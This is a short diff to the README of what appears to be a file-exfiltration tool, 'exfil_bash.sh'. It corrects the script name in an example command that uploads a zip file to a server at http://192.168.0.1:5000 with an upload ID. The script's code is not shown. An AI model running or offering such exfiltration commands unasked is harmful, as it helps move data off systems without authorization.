@@ -16,4 +16,4 @@ The bash script takes in the input of the zip file to be transferred and automat
 `./exfil_bash.sh <file> <server_url> <upload_id>`
 
 Example:
-```./exfil_bash yourfile.zip http://192.168.0.1:5000 randomstring-001```
+```./exfil_bash.sh yourfile.zip http://192.168.0.1:5000 randomstring-001```
